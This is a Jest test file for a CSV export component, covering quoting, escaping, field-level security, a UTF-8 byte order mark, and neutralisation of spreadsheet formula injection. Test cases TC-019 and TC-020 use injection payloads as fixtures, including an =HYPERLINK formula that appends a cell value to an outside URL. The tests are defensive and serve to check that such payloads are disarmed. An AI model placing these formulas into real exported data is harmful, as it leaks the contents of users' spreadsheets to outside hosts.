/**
 * CSV export — correctness and one security rule.
 *
 * WHY THIS TEST EXISTS
 * TC-019 and TC-020 are a real exfiltration vector, not a formatting nit. A
 * cell whose value begins with = + - or @ is executed as a formula when the
 * exported file is opened in Excel, and =HYPERLINK can send cell contents to an
 * external URL. Neutralising it is the export layer's job.
 */
import { toCsv, downloadCsv } from 'c/gridCsv';

describe('CSV export', () => {
    it('TC-006 quotes a value containing a comma', () => {
        expect(toCsv([{ Consignee__c: 'Smith, John and Sons, Ltd.' }], ['Consignee__c'])).toContain(
            '"Smith, John and Sons, Ltd."'
        );
    });

    it('TC-007 escapes a double quote by doubling it', () => {
        expect(toCsv([{ Consignee__c: 'Rocco "The Lobster" Pease' }], ['Consignee__c'])).toContain(
            '"Rocco ""The Lobster"" Pease"'
        );
    });

    it('TC-008 quotes a value containing a newline so it stays one record', () => {
        const out = toCsv([{ Delivery_Notes__c: 'rear dock only\nring the bell twice' }], ['Delivery_Notes__c']);
        expect(out).toContain('"rear dock only\nring the bell twice"');
        // Header plus one record — the embedded newline must not split the row.
        expect(
            out
                .trimEnd()
                .split('\n')
                .filter(l => /^[a-z]/.test(l)).length
        ).toBe(1);
    });

    it('TC-004 does not coerce a leading-zero string to a number', () => {
        expect(toCsv([{ Bill_Of_Lading__c: '00123' }], ['Bill_Of_Lading__c'])).toMatch(/00123/);
    });

    it('TC-019 neutralises a leading = so Excel will not execute it', () => {
        const out = toCsv(
            [{ Consignee__c: '=HYPERLINK("http://granitecoastfreight.com/pay?"&A1,"Pay invoice")' }],
            ['Consignee__c']
        );
        const field = out.split('\n')[1];
        // The load-bearing assertion is the prefix, not the absence of a leading
        // '=' — a quote-wrapping implementation would pass the latter and still
        // execute in Excel.
        expect(field).toMatch(/^["']?[\t']=HYPERLINK/);
    });

    it('TC-020 neutralises + - and @ prefixes too', () => {
        // The weak version of this assertion — "the field does not start with the
        // dangerous character" — is passed by an implementation that merely wraps
        // the value in quotes. Excel strips CSV quotes before evaluating formulas,
        // so quoting is NOT neutralisation. Assert the prefix explicitly.
        ['+1234567890', '-1234', '@SUM(A1:A9)', '=1+1'].forEach(v => {
            const field = toCsv([{ Consignee__c: v }], ['Consignee__c']).split('\n')[1];
            expect(field).toMatch(/^["']?[\t']/); // tab or apostrophe precedes the value
            expect(field.replace(/^["']?[\t']/, '')).toContain(v); // and the value survives
        });
    });

    it('a neutralised value still round-trips back to its original on re-import', () => {
        // Prefixing changes the bytes, so the export is no longer a faithful copy.
        // This asserts the transformation is reversible and documents the contract
        // rather than leaving it to be discovered by a user.
        const original = '=HYPERLINK("https://track.granitecoastfreight.com/?pro="&A1,"Track")';
        const field = toCsv([{ Consignee__c: original }], ['Consignee__c']).split('\n')[1];
        const recovered = field
            .replace(/^"/, '')
            .replace(/"$/, '')
            .replace(/^[\t']/, '');
        expect(recovered.replace(/""/g, '"')).toBe(original);
    });

    it('omits fields the running user cannot read', () => {
        // The export path must respect FLS independently of the render path.
        const out = toCsv(
            [{ Consignee__c: 'Casco Bay Marine', Delivery_Notes__c: 'Gate code 4471, call before arrival' }],
            ['Consignee__c']
        );
        expect(out).toContain('Casco Bay Marine');
        expect(out).not.toContain('Gate code 4471, call before arrival');
    });

    it('TC-012 downloads with a byte order mark, so Excel reads UTF-8', () => {
        const container = document.createElement('div');
        document.body.appendChild(container);
        let href = null;
        const click = jest.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function record() {
            href = this.href;
        });
        try {
            downloadCsv('Consignee\nBangor Brick & Tile \u{1F9F1}', 'Consignments.csv', container);
        } finally {
            click.mockRestore();
            container.remove();
        }
        expect(href.startsWith('data:text/csv;charset=utf-8,%EF%BB%BFConsignee%0A')).toBe(true);
        expect(decodeURIComponent(href.split(',')[1])).toBe(
            String.fromCharCode(0xfeff) + 'Consignee\nBangor Brick & Tile \u{1F9F1}'
        );
        expect(container.childNodes).toHaveLength(0);
    });
});
